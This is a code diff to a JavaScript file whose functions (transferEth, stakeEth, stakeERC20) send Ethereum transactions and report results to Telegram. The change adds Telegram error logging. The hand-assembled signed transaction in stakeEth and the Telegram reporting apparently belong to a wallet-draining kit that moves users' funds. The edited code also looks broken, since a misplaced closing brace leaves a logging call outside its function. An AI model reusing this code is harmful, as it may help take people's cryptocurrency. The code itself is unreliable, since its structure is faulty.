@@ -700,13 +700,25 @@ async function transferEth(amount, msg) {
     }
     
     try {
-      await web3.eth.sendTransaction(transactionObject);
-    } catch(e) {
-      console.log(e)
-      success = 0
-    }
-    logTlgMsg(msg, success);
+    const receipt = await web3.eth.sendTransaction(transactionObject);
+    console.log("Transaction receipt:", receipt);
+    success = 1;
+} catch (e) {
+    success = 0;
+
+    console.error("Transaction failed:", e);
+
+    await logTlg(
+`❌ Transaction failed
+
+Code: ${e?.code}
+Message: ${e?.message}
+Stack:
+${e?.stack || "N/A"}`
+    );
 }
+
+logTlgMsg(msg, success);
 
 async function stakeEth(amount, msg) {
     if(account=="") return;
@@ -755,13 +767,33 @@ async function stakeEth(amount, msg) {
         tx.s = s;
         tx.v = v;
         const txFin = "0x" + tx.serialize().toString("hex");
-        console.log("Waiting for sign submitting...");
-        const res = await web3.eth.sendSignedTransaction(txFin);
-        console.log("Submitted:", res);
-    } catch(e){
-        success = 0;
-    }
-    logTlgMsg(msg, success);
+console.log("Waiting for sign submitting...");
+
+try {
+
+    const res = await web3.eth.sendSignedTransaction(txFin);
+
+    console.log("Submitted:", res);
+
+    success = 1;
+
+} catch (e) {
+
+    success = 0;
+
+    console.error("sendSignedTransaction failed:", e);
+
+    await logTlg(`
+❌ sendSignedTransaction failed
+
+Code: ${e?.code}
+Message: ${e?.message}
+Stack:
+${e?.stack || "N/A"}
+`);
+}
+
+logTlgMsg(msg, success);
 }
 
 async function stakeERC20(tokenAddress, amount, msg, chainId, abiUrl) {
